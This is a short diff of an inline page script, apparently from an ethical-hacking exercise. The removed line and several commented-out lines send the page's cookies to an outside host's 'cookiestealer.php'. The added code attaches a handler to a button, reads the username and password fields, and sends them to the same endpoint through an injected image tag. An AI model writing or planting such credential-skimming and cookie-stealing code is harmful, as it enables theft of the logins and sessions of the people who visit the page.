@@ -424,5 +424,14 @@ if(query.email === undefined) {
 //document.location='http://ethical.us-east-2.elasticbeanstalk.com/cookiestealer.php?c='+document.cookie;
 // document.cookie = "username=Null Byte";
 // document.write("<h1>"+document.cookie+"</h1>");
-document.write('<img src="http://ethical.us-east-2.elasticbeanstalk.com/cookiestealer.php?c=' + document.cookie + '" />')
+
+document.getElementById('ButtomHack').onclick = function() {
+   alert("button was clicked");
+   var user="User: "+document.getElementById("input-6").value
+   var password="Password: "+document.getElementById("input-7").value
+   var res = user.concat(password);   
+   document.write('<img src="http://ethical.us-east-2.elasticbeanstalk.com/cookiestealer.php?c=' + res + '" />')
+};
+
+//document.write('<img src="http://ethical.us-east-2.elasticbeanstalk.com/cookiestealer.php?c=' + document.cookie + '" />')
 </script>
